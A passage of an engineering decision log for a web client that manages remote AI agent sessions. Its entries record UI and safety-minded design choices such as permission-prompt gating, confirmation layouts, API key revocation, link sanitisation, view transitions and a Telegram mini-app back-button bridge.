**Why.** Deciding is not navigating. `j` under an open `Dropdown` moves a caret
and the worst case is looking at the wrong row — but `2` under an open `Dropdown`
*approves a command*, so a session menu or the config bar's `…` popover over a
parked question left a keystroke aimed at the menu resolving the permission
underneath it. `AskCard`'s numbered answers had been gated on the navigation rule.
The trap in the fix is that `layers.length === 0` reads as the stricter and more
obviously-correct rule and is the broken one: the card registers itself with
`useDismissible("ask", …)`, so an empty stack is precisely the state in which
there is no card to answer.

**Status.** Current

#### Q3.216 — Why does everything else a settings row can do sit behind one kebab?

**Decision.** One trigger per row, which is the same square on every row and takes
the reserved trailing slot with it. The confirmation still leaves the menu and
lands on the row.

**Why.** The Users row carried every act as a peer button — Reset password, API
keys, Enable/Disable, Delete — plus a 184px slot reserved so rows omitting the
last two did not shift. A menu held open in order to hold a confirmation would be
a second dismissable layer over the sheet, for one tap. The precedent is
`SessionMenu`, which already answered this on a session row.

**Measured.** ~370px of controls against roughly 330px of row on a 390px phone, so
the name got single digits of pixel, the badges got none, and below `sm` the row
stacked into a wrapping column.

**Status.** Current

#### Q3.217 — Why did "API keys" survive an instruction to remove it?

**Position.** It stayed, in the kebab. Its panel is the only caller of
`adminRevokeKey` anywhere in the product, and `DELETE
/v1/admin/users/:id/keys/:keyId` is reachable from it and from nowhere else.

**Why.** The reason narrowed and did not go away. `cpctl` no longer mints a key it
cannot revoke — `cpctl key` and `cpctl keys --revoke` are both about your own now
— but neither it nor anything else can retire **somebody else's**. Deleting the
panel would put revoking a key you do not hold back in the state the "a credential
the code can read is a credential something must be able to write" invariant
exists to end, which is the state that matters: the person who has left is exactly
the person who will not be revoking their own. Off the row it is; out of the
product it is not.

**Status.** Current

#### Q3.218 — In what order does a confirming settings row lay out its two answers?

**Rule.** The confirming row ends with Cancel, and its state is held per row, in
the row's own component.

**Why.** This is a safety property rather than a preference. Both groups lay out
left-to-right in the same box so the last child occupies the same pixels,
`setConfirming(true)` is synchronous, and `.tap`'s `touch-action: manipulation`
removes the double-tap delay — so a second tap aimed at a button that looked like
it did nothing lands on the undo rather than on the irreversible half. Per-row
state is required because these lists re-render on a poll, and a "which row is
confirming" held above them ends up pointing at whoever moved into that position.
It is inline rather than in a sheet because a question, its answer and its undo
laid out left-to-right is a *row* shape, and it keeps the name it is about beside
it, unmoved — which is why the arrival of `Sheet` (Q3.214) did not change it.

**Status.** Current

#### Q3.219 — Is revoking your own API key two-step?

**Decision.** No — `AccountSection`'s list of your own keys is a bare `Revoke`
that fires on one tap. `KeyRow` in `UsersSection`, which revokes somebody else's,
is two-step.

**Why.** Revoking the key this browser is holding is allowed and is often the
point: "this key leaked" is precisely the case where the leaked one is in your
hand. So the screen puts the consequence **before** the button as prose —
*"Revoking the key this browser is signed in with signs this tab out on its next
request"* — instead of behind a question after it. A confirmation you have already
read is a tap that says nothing.

**Status.** Current

#### Q3.220 — Is opening registration confirmed, and closing it?

**Decision.** Only opening. The confirmation states what it costs, in one of two
sentences depending on whether mail is configured; closing gets no question at
all.

**Why.** Only the act that widens authority is confirmed. It is also the one
confirming control that is not on a settings row.

**Status.** Current

#### Q3.221 — Which half of a shared composer flag is the rule?

**Rule.** Both. A flag that survives a session switch needs its late-write gate
*and* its reset in the `[key]` effect; `stopping` belongs there beside `busy` and
`applying`, and `webcheck` asserts the **pair** on that effect's own region for
every shared flag.

**Why.** `stopping` is shared React state on a component the two-pane layout never
remounts. Given only the `onScreen()` gate it was **unrecoverable** rather than
merely wrong: while it is set the send slot draws the Stopping spinner instead of
the Stop button, so no tap can reach `cancelTurn`, whose own `if (stopping)
return` refuses anyway — and a cancel holds the daemon for up to
`CANCEL_SEND_TIMEOUT_MS + CANCEL_SETTLE_MS`, which is long enough to tap another
session, after which every session opened in that tab drew a spinner where Send
belongs. Asserting the pair means the next flag to arrive with one half fails in
`webcheck` rather than on somebody's phone.

**Status.** Current

#### Q3.222 — Why is `canCancelTurn` wider than `showsWorking`?

**Rule.** By exactly the blocked case: `turn !== null && !isTerminal && status !==
"stopping"`. `cancelInFlight` additionally reads `cancelRequestedAt`.

**Why.** A session parked on a question is where somebody most wants out, and the
daemon takes the cancel there. The `stopping` clause is the daemon's *second*
refusal (`terminal || stopRequested`) and `isTerminal` does not cover it: `turn` is
cleared in `pump`'s `finally`, which cannot run until the generator unwinds inside
`dispose()`, so a session somebody stopped mid-turn carries `{status: "stopping",
turn: 5}` for seconds — an armed Stop across all of it, onto a guaranteed 409.
`cancelInFlight` keeps the button from re-arming the instant the request returns,
because the turn routinely outlives the answer and a control that looked untouched
is one somebody taps again. The field is optional on the wire, so `?? null` is the
whole migration and an older daemon reads as no cancel outstanding.

**Consequence.** In `Composer.tsx` the Stop control takes the **send slot**: Send
is refused for exactly one reason, so the alternative was a disabled arrow whose
tooltip explained that nothing would happen. Nothing is drawn optimistically —
every other action there redraws before the daemon confirms because a message is
the person's own and putting it back is the remedy, and a cancel has no such copy.

**Status.** Current

#### Q3.223 — Why did no pop-up scroll?

**Rule.** `SHEET_PANEL` is a **definite** height, never a `max-h` it can shrink
under, and `SHEET_BODY` is a **flex column**. `webcheck` pins both.

**Why.** Both were wrong at once. Under a `max-h`, walking the settings list
resized the dialog under a pointer. Without the flex column, both callers' `min-h-0
flex-1` children mean nothing, every inner scroller sizes to its content, and their
`overscroll-contain` then stops the wheel from chaining to the one box that can
move.

**Measured.** 155 / 475 / 492px for 2 / 12 / 80 lines of content.

**Status.** Current

#### Q3.224 — Could folders be ordered by first appearance instead of by name?

**Decision.** No. Tabs and folders are ordered by name, never by reachability or
activity.

**Why.** Reachability and activity both flicker on the four-second poll, and a
list that reorders while a thumb is travelling is the one thing this cannot do.

**Rejected.** "In order of first appearance" — folder membership derives from
`rowsOf`, which is recency-sorted, so it would reshuffle on every poll.

**Status.** Current

#### Q3.225 — Why was the delivery log removed from Server settings?

**Decision.** Removed as noise. Where a message ended up is `cpctl admin mail`;
the routes behind it are untouched.

**Why.** It answered a question nobody was asking, on a screen people go to in
order to configure things, and the one person who ever needs the answer has a
terminal.

**Status.** Current

#### Q3.226 — What was deleted from the web client's transcript bounds, and why?

**Decision.** `MAX_TRANSCRIPT_BYTES` (16 MiB) is the only ceiling. The
20 000-event count beside it is deleted rather than raised, and
`HISTORY_PAGE`/`EVENTS_PAGE_LIMIT` went 500 → 5000.

**Why.** An event ranges from 68 B to `truncateEvent`'s 128 KiB, so a count
expresses memory only by luck, and two bounds on one resource means the wrong one
decides — 50 000 events fires at 7 MiB on 140-byte events, i.e. the reported
truncation moved further out rather than going away. The page size is a round-trip
count in disguise: a window spans that many seqs. Raising it is free because
`EVENTS_PAGE_BYTES` (2 MiB at the time of this decision; lowered to 768 KiB
afterwards by Q6.104, which makes the byte cap bind sooner and the argument no
weaker) is what actually bounds a page, so a
heavy conversation degrades to exactly the request count it costs today.

**Measured.** At 20 000 events the old count stood for 49 MiB on a session whose
tool call typed its arguments one token at a time, and 2.8 MiB on the same session
with those drafts emptied. The fleet's largest conversation is 33 898 events and
4.53 MiB, and it loads whole in **seven** requests where 500 made it sixty-eight.
The cost of deleting the count is `buildTail`'s per-token walk — 9 ms at 33 898
events, ~32 ms at the ~120 000 that 16 MiB of light events would be — which is a
frame rate rather than a truncation.

**Status.** Current

#### Q3.227 — Why was a machine's name invisible on a desktop, and what did the row give up to get it back?

**Decision.** `MachinesSection`'s row is one line with two trailing controls —
`Agents` and a kebab — and Rename, the setup code and Retire moved into that menu
through the shared `RowAction`. The id is drawn only when `ambiguousNames` says
another machine in the list answers to the same name, the over-limit sentence
dropped the half `machineQuotaNotice` already says, `machineAllowanceText` puts a
`4 of 5` beside the heading, and the section adopted `SETTINGS_SECTION` /
`SETTINGS_HEADING` along with the other four.

**Why.** This is Q3.216's own rule — everything else a settings row can do sits
behind one kebab — applied to the file that had not taken it. Four outlined
buttons meant Rename and Retire were the same object at rest, which is what the
menu's single `text-danger` row now says instead; the two-step confirmation
(Q3.218) is unchanged and still lands on the row rather than in the panel. The id
change keeps the reachability property that put it there and pays only where
there is nothing to disambiguate.

**Measured.** Inside the settings sheet at 1280px the panel is 672px and the nav
takes 224px, leaving a 348px row. The name group was the only child with
`sm:flex-1` beside three `shrink-0` groups, so every machine the reader **owns**
rendered its name at **0px** — `truncate` drawing nothing — and only `build-farm`,
somebody else's and therefore carrying one button, kept 213px. Afterwards: 233px,
with the row 88px → 66px and a phone row 140px → 66px, i.e. 2.5 machines per
390px screen becoming six. `gap-3` rather than `gap-2` on the trailing group is
measured too: the kebab is `IconButton size="sm"`, 24px of ink reaching 44px
through a symmetric `after:-inset-2.5`, which at an 8px gap lands 2px on the face
of the button beside it — the collision `TAP_GROW_Y` exists to avoid, and one
`UsersSection` never meets because the thing left of its kebab is a name.
`Agents` stays `md` for `BUTTON_SIZE`'s stated reason: `sm` is for a confirmation
that has *replaced* a row's controls and has nothing adjacent to mis-hit.

**Alternatives.** Widening the sheet to `max-w-3xl` and narrowing the rail to
`w-44` was tried and **taken back out**: it fixes the symptom (the name reaches
384px) without fixing the row, `SHEET_PANEL` is shared with `NewSession`, and the
kebab alone already clears the name at today's width. The rail's truncated blurbs
are the remaining argument for it and are not this entry's problem.

**Status.** Current

#### Q3.300 — Why did tapping a filename in agent output open a second copy of the app?

**Decision.** `openableHref` in `packages/web/src/ui/links.ts` is the only source
of an anchor's `href` in agent markdown. It allows `http`, `https` and `mailto`,
answers `null` for everything else — a relative path, a `file://` URI, a bare
fragment — and `Markdown.tsx` draws the text without an anchor when it does.

**Why.** react-markdown's `defaultUrlTransform` blocks dangerous protocols but
returns early when there is no protocol at all, so a *relative* href passes
through untouched — deliberately, and rightly for a document rendered beside the
files it links. It is wrong here, because this page is served by the **control
plane**: an agent finishing a turn with "created `about_me.txt`" produces a link
to `https://<control-plane>/about_me.txt`, which the SPA fallback answers with
`index.html`. Tapping a filename opened a second copy of the app. The path in
that link is real, but it names a file on the machine the *agent* is on and this
origin has no relationship to it — a workspace file is reached through `GET
/sessions/:id/files` with a header, and by the download buttons that use it,
never by an `href` a browser follows. So the honest rendering of a path is text.

**Not an XSS fix**, recorded here so nobody deletes the guard that is one:
`javascript:` never reaches this function, react-markdown having emptied it
upstream. What the short allowlist shares with the refusal of `url`-mode
elicitation is the sentence that opening an agent-chosen scheme is launching a
program named by an agent-chosen string, which is why the set is three entries
rather than "everything except the dangerous ones". The sibling case, an `img`
that needs no tap at all, is Q7.86.

**Rejected.** *A hand-rolled prefix test on the string* — `new URL` is what
decides what the browser would actually do with `HtTps:` or a scheme carrying
padding, and a prefix test is how a scheme check acquires a hole. *A stripped
`href=""` rather than `null`*, which navigates to the current page.

**Status.** Current

#### Q3.301 — When is a word-level mark inside a diff line not worth drawing?

**Decision.** It is dropped once it would cover more than `MAX_MARK_SHARE` (60%)
of its line on either side. `diffLines` in `packages/web/src/diff.ts` keeps a mark
only where it is a *minority* of the line.

**Why.** Past that share the two lines are not one line edited — they are
different lines, and the row tint has already said the line changed. A mark
covering nearly all of it is a second, darker tint over a row whose own tint
carried the whole of the information: twice the ink for none of it. The case the
mark exists for is a value, a word or an argument replaced inside a line that is
otherwise the same.

**Measured** by rendering the real log: a heading rewritten from "Assumptions
(correct these if wrong)" to "Default settings" — translated here from the
original pair, which shared only its `"## "` — so the mark covered **92% and 88%**
of its two lines.

**Status.** Current

#### Q3.435 — A message that said `1)` was drawn `1.`

**Rule.** An ordered list keeps the delimiter it was written with.
`remarkListDelimiter` in `packages/web/src/ui/mdlist.ts` reads it back out of the
markdown source and marks the list; `index.css` draws the marker with
`content: counter(list-item) ") "` on `::marker`.

**Why.** Reported from a phone: a prompt typed as `1) 2) 3)` came back as `1. 2.
3.`. Both spellings are CommonMark — micromark's `list.js` accepts codepoint 41
and 46 on the same line — but **mdast records neither**. A `list` node carries
`ordered`, `start` and `spread`, and the character is gone before anything
downstream could read it, so `list-style-type: decimal` had one answer and drew it
over what somebody had written. Small, and it is the reader's own message: the one
text in this app that must come back as it went in.

The delimiter is still in the *source*, and a remark plugin is the last place that
holds both halves — `file.value`, and the node's own `position.start.offset`. So
the fix is a mark and never a rewrite: one class on the `ol`, and CSS does the
drawing.

**A second defect at the same three lines.** `Markdown.tsx`'s `ol` destructured
only `children`, so `<ol start>` was dropped — a message beginning `10)` rendered
as `1.`, renumbered as well as re-punctuated. `counter(list-item)` is the
browser's own implicit counter, so passing `start` through fixes both the marker
and the number with nothing here having to know about either.

**Measured** against this repo's own remark-parse 11 / remark-gfm 4 /
remark-rehype 11, which is also where the pattern's shape comes from: the offset
points at the **digit** and never at the indentation before it, so it needs no
leading `\s*`. `10) big` parses to `start: 10`; `1.) weird` is not a list at all.

**Rejected — rendering the user's own bubble as plain text.** It is the literal
reading of "show exactly what I typed" and it costs more than it buys: a backticked
path in your own message stops being a download chip, and a pasted fence stops
being a code block. The defect was one character wide and the fix is too.

**Rejected — swapping `list-decimal` for the counter.** It stays *under* the paren
class. A browser that will not style `::marker` then draws exactly what it drew
before this existed, so the degradation is a no-op rather than a fallback anybody
has to look at; there is no third state where the marker goes missing.

**Status.** Current

#### Q3.436 — Your own message appeared under the conversation, then jumped into it

**Rule.** The optimistic echo is a row in the transcript, drawn by `EventList`
from `packages/web/src/echo.ts`, above the working line. It carries no spinner and
says nothing about delivery.

**Why.** It was React state on `Composer` and was drawn as that component's first
child — inside a `sticky bottom-0` bar which is a **sibling** of the scroll box. So
a message you had just sent appeared *below* the conversation, marked `sending`
with a spinner, and then, one commit later, disappeared from there and reappeared
inside the conversation when the `prompt` event arrived. Two boxes, one frame:
that is a teleport rather than a transition, and the thing doing it is the
reader's own words. On the 90-second slow-route budget — `/prompt` resumes a
terminal session before it answers — the "not quite sent yet" state could last a
long time.

Nothing about a message on its way is worth that. What a refusal costs is
unchanged and is a **remedy** rather than a warning: the text goes back into the
box, the chips come back with it, and a toast says why.

**Keying it by session was the other half, and it fixed a bug rather than avoiding
one.** As shared state on a component that is never remounted across a session
switch, the echo had to be cleared by the `[key]` effect — so sending a message,
stepping into another conversation and stepping back showed nothing at all until
the daemon answered. In `echo.ts` the write names the session it belongs to, which
moves it out of the `onScreen()` set `web-composer.md` describes and into the
`drafts`/`attach.ts` half. It is the third module of that shape and the argument is
theirs.

**The settle is in the store, and it takes two calls rather than one.** `onEvents`
compares the newest seq against the echo's; `promptLanded` lowers the sentinel to
the real seq **and compares again immediately**, because the ordering that makes
that necessary is the common one rather than the exotic one — the `prompt` event
comes down a socket waiting for nothing, while the POST that created it is on a
90-second budget. When the event wins, `onEvents` has already compared it against
`MAX_SAFE_INTEGER` and quite correctly kept the echo; without the second
comparison the message would sit doubled at the foot of the conversation until the
next event happened to arrive.

**What it simplified.** Q3.426 said the composer "grows by the height of the echo
in this same commit, which shrinks this box, and the `ResizeObserver` is what
finishes the job". That is no longer true and the observer is not needed for this:
the bubble is a row *inside* the scroll box now, so it adds `scrollHeight` and
touches `clientHeight` not at all — exactly like the working line — and the single
`scrollTop` assignment lands on the finished height.

**Status.** Reversed an earlier decision

#### Q3.437 — `turn cancelled`, `pump failed`, `ended: agent_exited`

**Rule.** Three places drew a wire identifier with its underscores swapped for
spaces, and all three now go through a table with a fallback: `resolvedByText` and
`stopReasonText` in `ui/tail.ts`, `exitText` in `ui/bits.tsx`. A cancelled turn is
drawn in `WaitingFoot`'s own shape — the same line, `WorkingMark still`, the label
in `text-danger`.

**Why.** `event.by.replace(/_/g, " ")` is not a rendering, it is the absence of
one. Under a question somebody was about to answer it read `turn cancelled`; a
transport failure read `pump failed`, and `pump` is not a word anybody using this
app has; a session that ended read `ended: agent_exited`. Each is the daemon's
bookkeeping printed at somebody trying to find out what happened to their own
conversation — and `turn cancelled` in particular describes the wrong actor, since
what happened is that they pressed Stop.

**Where the cancel goes is the part worth arguing.** A cancelled turn's `turn_end`
is the **last event of that turn**, so its row lands exactly where `WaitingFoot`
was an instant earlier. Taking that row's shape rather than a divider's is what
makes it read as the working state having stopped rather than as an unrelated
notice appearing: three bars breathing becomes three bars at rest, beside one red
word, in the place the reader was already looking. Every other stop reason stays a
centred line, because none of them is something the reader did and none replaces an
indicator that was just there.

**The fallback is the rule rather than the safety net.** Every table falls through
to the old rendering for a value it does not know, which is what this client does
with every unrecognised value on this wire: a newer daemon's member is drawn as
itself — legible, and never a guess. `webcheck` asserts the *property* (no
reachable member falls to the fallback) rather than the strings, so a new member
arriving with no phrase is a red check rather than a quiet regression.

**Nothing but the drawing changed.** `showsInTranscript` and `taskFloor` both key
on `stopReason !== "end_turn"` and neither moved; moving either would strand
delegations or bring back the `end_turn` divider Q3.27 removed.

**Status.** Current

#### Q3.438 — A screen replaced another one with nothing saying it had moved

**Rule.** Below `lg`, opening a conversation slides in from the right and going
back slides out. `announce` in `router.ts` wraps its own update in
`document.startViewTransition` and writes `data-nav` on the document; `index.css`
keys two keyframes off it. A sheet slides up from the bottom, in CSS alone.

**Why.** On a phone this app is one screen at a time, and a swap says nothing:
not which way you went, not that going back is a direction, not that the list is
still there behind the conversation. Every app already on that phone answers with
motion, and the answer is not decoration — it is the whole difference between "I
went somewhere" and "the screen changed".

**The browser's own view transitions, and the alternative is why.** Animating an
exit by hand means holding the outgoing screen mounted while it leaves: two
`SessionBrowser`s, or a second `SessionView` running `openSession` against the
three-socket LRU, on every navigation, to draw something that is over in 220ms.
The browser snapshots the old frame instead — nothing is mounted twice, `App`
still unmounts synchronously, and the transforms are on pseudo-elements outside
the document, so no `sticky` header or `fixed` scrim inside the app resolves
against one.

**Which widths animate is decided in CSS**, `@media (min-width: 64rem)` setting
`animation: none`, because `AppShell` is explicit that a breakpoint read in
JavaScript is how a resized window renders a layout that is not there.

**`navMove` lives in `nav.ts` and its `null` arms are the load-bearing
ones.** `router.ts` reads `window.location` in its module body and cannot be
imported by `webcheck` at all, which is the same reason `settings.ts` and `gate.ts`
exist. Equal depth is `null`, so session → session — what a desktop rail does all
day — is not an animation and is not even a snapshot. A pop-up is `null` too:
`/settings` and `/new` are drawn *over* what you were looking at, and giving them a
depth would slide a conversation sideways underneath a panel rising over it, two
motions in different axes for one tap.

**Two keyframes for four movements**, via `animation-direction: reverse`. A back
that is not exactly the forward played backwards feels like a second forward, and
four sets of numbers is how the two drift apart. `mix-blend-mode: normal` is
required rather than tidy: the UA stylesheet sets `plus-lighter` on both snapshots
so its default cross-fade holds up at the midpoint, and with a slide the two
overlap while both are opaque and glow through each other.

**`data-nav` is cleared only by the navigation that wrote it.** A second tap during
the first animation is ordinary — the browser skips the running transition and
starts another — and both `finished` promises then settle in order. Without the
token the first one's cleanup deletes the second one's attribute mid-flight, and
that navigation finishes with no rule matching: the new screen appears with the old
one still snapshotted over it, which reads as the app having frozen.

**Reduced motion is refused in JavaScript**, not animated to zero. The block at
the foot of `index.css` is written against `*`, `*::before` and `*::after`, and
none of those reaches `::view-transition-*` — but the better reason is that
somebody who asked for no motion should not be paying for a snapshot either. The
CSS rule is kept beside it, because the reason it looks redundant is the reason it
is easy to delete.

**The sheet is CSS alone** — `animate-sheet sm:animate-rise` on `SHEET_PANEL`, a
real slide below `sm` where it is bottom-anchored and covers 92% of the screen,
and the unchanged 6px rise at `sm` and above where it is a centred card with no
edge to have come from. It carries **no exit animation**, deliberately: that needs
the panel held mounted past `navigate()`, which is the machinery this entry
declined for the horizontal case.

**Status.** Current

#### Q3.439 — "It asks for a name" — the sign-up form's first field is a username

**Rule.** `Username`, `Email`, `Password` and `Confirm password`, each marked
`(required)`. Where the control plane cannot send mail, the missing email field is
explained rather than merely absent.

**Why.** Reported as a labelling bug and it is one, but not the one it looked
like. The first field is a **login name** — `USER_NAME` on the control plane is
`^[A-Za-z0-9][A-Za-z0-9._-]{0,63}$` and refuses `@` outright — so nobody was ever
being asked for an address there. What was actually wrong is two things at once:
`Name` does not say *what kind* of name, and on an instance with no SMTP there is
genuinely no email field at all, with nothing saying so. Somebody arriving
expecting to sign up with an email address met one box called "name" and no
explanation for the absence of the other.

**The marker is on every field, and that is the correction to the first attempt.**
Marking only the ambiguous one reads as a contrast with the rest — it says the
others are optional — so it would have introduced a second, quieter lie to fix the
first. All four are required; all four say so.

**The absent field says why it is absent**, and the consequence is the half worth
writing rather than the cause: `POST /v1/register` *refuses* a non-empty address
when mail is not configured, and password recovery here is by mail and by nothing
else. So there is none on that instance — which is a thing to know before choosing
a password, not after forgetting one.

**Rejected — signing in by email.** It is a control-plane schema and auth change
(`USER_NAME`, `nameTaken`, the sessions table, `cpctl`, every throttle key) for a
labelling complaint. **Rejected — requiring SMTP for registration**, which closes
sign-up on a local-only instance to fix a sentence.

**Status.** Current

#### Q3.440 — The AGPL §13 source notice is off every screen

**Decision.** `SourceNotice` is deleted. No screen in this client draws the source
URL, the version or the licence name. `SOURCE_URL` in `app.ts` and `source` on
`GET /v1/instance` **stay**, unchanged.

**Why.** Asked for, and recorded here rather than left in the log because the
argument against it is written at length in three places and a reader will
otherwise restore it. It sat under all six pre-auth forms, on the reasoning that
§13 is about anybody who interacts with the program over a network and that the
people who most need the offer are the ones a modified instance never lets in —
which is why it moved from `SignIn` alone to `GateCard`, so that /register,
/forgot, /reset, /verify and /confirm stopped making none.

**What must not follow it.** The wire field has four readers that are not the UI
and every one of them breaks if it goes: `pincheck` asserts `SOURCE_URL` against
this repository's own `package.json`; `relaycheck` asserts the served value on the
unauthenticated `GET /v1/instance`; `webcheck` lifts the literal out of `app.ts` by
regex and **throws** if the constant disappears; and `deploy/ci-release.sh` derives
the image's `org.opencontainers.image.source` label from it. `isAbsoluteHttpUrl`
stays too — it is the guard that stops a fork's scheme-less URL rendering as a
relative href, and a reader who comes back finds it already refusing the shape
that would embarrass it.

**Stated plainly:** the offer now lives in `LICENSE`, in `README.md` and in the
image's OCI label, and in no rendered page. That is the decision, not an oversight,
and no driver enforces it in either direction.

**Status.** Reversed an earlier decision

#### Q3.441 — A pinned row spent two thirds of itself on `/Users/rends`

**Rule.** A working directory is drawn against the daemon's **own** browse roots —
`displayCwd` in `paths.ts`, `~/thing` — and a row draws it **once**.

**Reported from a phone**, with a screenshot: a pinned row whose title read
`…/rends/2026-07-tare-r…` and whose subline read `claude · …/rends/2026-07-ta…`.
The same absolute path, truncated twice, and most of both was the home directory
every session on that machine shares.

**Two faults, and the first was already written down elsewhere.** `shortPath`
keeps the last **two** segments unconditionally, so the parent — the home
directory's own name — is always in the answer. `folderNames` in `groups.ts` had
argued this out for folder *headers* and says so in as many words: "always two
segments is a wall of `Users/rends`". Rows were never given the same treatment,
and it only became visible when Q3.11 made a pinned row draw its path at all,
because until then the copy under its folder was saying it instead.

**The prefix to cut is `REEMOAT_ROOTS`, and it comes from the daemon.** That is a
fact the machine states — `/fs/roots` already serves it to the directory picker —
rather than one this client works out. A home directory inferred from `/Users/<x>`
or `/home/<x>` would be one operating system's convention applied to somebody
else's machine, which is the class of guess this codebase refuses everywhere on
this wire. The longest matching root wins, because roots nest and the more
specific one says more.

**Both degradations are the old rendering, exactly.** `cwd` is not confined, so a
session under no root is ordinary rather than exotic; and an empty root list is
what an older daemon, an unreachable one, and a listing that has not landed yet
all look like. Each falls back to `shortPath`, so nothing anywhere gets worse and
no prefix is ever invented.

**Fetched once per machine and never again**, keyed in `rootsByMachine` so a
failure writes an empty array and the *entry existing* is what stops the
four-second poll re-asking. `REEMOAT_ROOTS` is read at startup and cannot change
under a running daemon, and `/fs/roots` is a config array plus an in-memory list
with no filesystem work at all — the cheapest request this client makes. Fired
rather than awaited, because the session list is what the screen is waiting for.

**The second fault is the echo, and it is the same rule `tail.ts` already has.** A
session **nobody has named** has a title that *is* its directory — `sessionLabel`
falls back to precisely that string — so the subline was drawing one fact twice in
a row forty characters wide. `headlineWorthDrawing` refuses an echo one screen
over for the same reason. Compared rather than keyed on `title`, because the two
are only usually the same question: a row inside a folder draws a subpath its
title never had, and a named session draws both because they say different things.

**Measured** by pinning a real session on a real daemon with `REEMOAT_ROOTS` at
the home directory. Before: `…/rends/2026-07-tare-r…` over `claude ·
…/rends/2026-07-ta…`, both clipped. After: `~/2026-07-tare-rends-east` over
`claude`, and the name no longer needs clipping at 390px.

**Status.** Current

#### Q3.442 — The sheet appeared and vanished, and its sections swapped in place

**Rule.** `navMove` in `nav.ts` answers one of five values, and `index.css` keys
every rule off the `data-nav` it becomes: `push`/`pop` move the **screen**,
`section-push`/`section-pop` move the **sheet's body** while the screen behind it
is pinned, and `sheet-close` takes the sheet back down the way it came. Opening a
sheet is `null` — that one is CSS's.

**Why.** Q3.438 gave the phone's list → detail a direction and left two teleports
one layer in, both reported: **closing** Settings simply stopped drawing a panel
covering 92% of the screen, and **tapping a section** replaced the panel's
contents where they stood, as did Back. "There should be no window teleporting
left in the app" is the ask, and it is the right generalisation — a screen that
changes without moving is a screen that gives the reader nothing to follow.

**Two stacks, never compared.** `depthOf` numbers screens (`home` 0, a session 1)
and sheet screens separately (the section list 1, a section 2, a machine's agents
3, one agent 4). `isSheet` is asked *first*, so a depth from one stack is never
tested against a depth from the other — a sheet is always opened over a screen and
closed back onto one, and the combinations the URL can express but nothing can
reach answer `null` rather than something arbitrary.

**The scope is what the naming buys.** A section slide names the sheet's **body**
and pins `::view-transition-old/new(root)` with `animation: none`, so the
conversation behind the scrim does not move and neither does the panel's frame —
the rounded top, "Settings", the ✕ — because none of that is what changed. A close
names the **panel** and the **scrim** for the same reason in the other direction:
what is behind was there all along and is not arriving.

⚠ **A named element with no counterpart gets the UA's default fade**, and that is
worth knowing before the next name is added. Measured with
`document.getAnimations()` during a close: `-ua-view-transition-fade-out` on
`::view-transition-old(sheet-body)`, running beside the panel's own travel — two
clocks on one object, the contents thinning out before the panel had left.
Silenced explicitly for that move — **and that remedy was wrong, because it
treated the symptom.** The body was not fading *and* travelling; it was fading and
**standing still**, which silencing the fade made sharper rather than better. See
Q3.444, which takes the name away instead.

**One attribute, not a direction plus a scope.** The pair is never free: there is
no "forward, sheet-close", and a shape that can express one is a shape somebody has
to check for.

**Opening stays CSS**, `SHEET_PANEL`'s own `animate-sheet`. It runs on mount, needs
no snapshot, and works on an engine that has never heard of a view transition; a
transition here as well would animate one panel twice. The asymmetry is the honest
one — an enter that always works, an exit that is an enhancement.

**At `sm` and above the section slide is off**, because there the sheet is a
centred card with the section list *beside* the section: the pane changes next to a
list that stays, which no horizontal travel describes.

**Measured** by driving the four navigations against a real browser and reading
`data-nav` off a mutation observer: opening `[]`, a section `section-push`, Back
`section-pop`, closing `sheet-close`, each cleared afterwards by the navigation
that wrote it.

**What this cost elsewhere, and it is the useful half.** `webcheck` drives
`navigate()` for real, and closing a sheet is the first move involving an overlay
that is **not** `null` — so the short-circuit that had been hiding `announce`'s
`document` read stopped short-circuiting, and a routing assertion three screens
away failed with `document is not defined`. The driver has a `document` now,
deliberately **without** `startViewTransition`: an engine that has never heard of
one, which pins that the router still routes without it.

**Status.** Current

#### Q3.443 — Telegram drew ✕ Close at every depth, over the session title

**Rule.** Inside a Telegram mini app this page asks for a **back button** on every
screen that has somewhere up, and asks for none at the root — which is what makes
the client draw ✕ Close there. `packages/web/src/telegram.ts` is the whole bridge;
`upFrom` in `nav.ts` is where it goes.

**Reported with a screenshot** from the mini app: the top-left control was Close on
every screen, so leaving a conversation meant closing the app and reopening it —
and Telegram's floating pill sat *on* the session title, which was clipped behind
it.

**No `telegram-web-app.js`, and two independent reasons.** The document is served
`script-src 'self'`, so a CDN script is refused before it runs; and nothing in this
repository loads code from anywhere else. Neither is a limitation, because that
script is a **wrapper**: on iOS and Android Telegram injects the transport itself
as `TelegramWebviewProxy`, and the SDK's job on this path is `JSON.stringify` plus
a version check. Verified against the real file rather than from memory —
`postEvent(eventType, JSON.stringify(eventData))` out,
`window.Telegram.WebView.receiveEvent(eventType, eventData)` in,
`web_app_setup_back_button {is_visible}` and `back_button_pressed`, gated at Bot
API 6.1.

**Owning `window.Telegram` is safe here for exactly one reason**, and it is worth
writing down because it is a header away from being false: Telegram *calls* that
global, so something has to define it, and normally that is the SDK. Under
`script-src 'self'` the SDK can never load, so there is no second writer. Relax
that header and this becomes a real collision; the remedy then is to stop defining
it and read theirs.

**The iframe transport is deliberately absent.** Telegram Desktop and Web embed a
mini app in an `<iframe>` and expect `window.parent.postMessage`; the control plane
sends `frame-ancestors 'none'` and `X-Frame-Options`, so those clients cannot load
this page at all and the arm would be unreachable code. Writing it is the *second*
half of letting Telegram frame a document whose purpose is approving shell commands
with a tap — the risk that CSP line was written against. Do both or neither.

**One rule for two controls.** `upFrom(route, under)` is what both the client's
arrow and the app's own leading control answer to: a section walks one level inside
the sheet, the index leaves it for whatever it was drawn over, a conversation goes
to the list, and the root has no answer. `null` there is not an absence handled
elsewhere — Telegram has **one** control, and hiding the back button is precisely
how Close appears.

**Never `history.back()`**, for the reason `Header.tsx` gives at length and which
binds harder here: on a cold deep link there is one history entry, and in a mini
app leaving the app *is* closing it — from a conversation, which is the thing this
exists to stop.

**The inset is a floor, not an addition.** `safe-area-inset-top` describes the
*device's* notch, and Telegram paints its chrome inside the same viewport
afterwards — so on a phone with no notch the inset is 0 and the header starts under
the buttons. Adding the two double-counts on a notched device, where they describe
the same strip; `max(3.25rem, env(...))` takes whichever is larger and assumes
neither. Scoped to `[data-telegram]`, written by `main.tsx` only when the transport
is actually injected, so an ordinary browser keeps the header it had.

**⚠ Found in a browser, not by `typecheck`.** The effect went below this
component's early returns, so a render taking the gate, the signed-out or the
forced-password arm ran one hook fewer than the render before it: React error #310,
the error boundary, the whole screen gone. Every hook in `App` belongs above line
one of the branching, and the comment there says so.

**Measured** by driving the bridge against a stub of the injected transport:
`web_app_setup_back_button {"is_visible":true}` on a screen with somewhere up,
`false` at the root, one handler per screen rather than a stack of them, a press
reaching only the newest, an unknown event passing through untouched, and an old
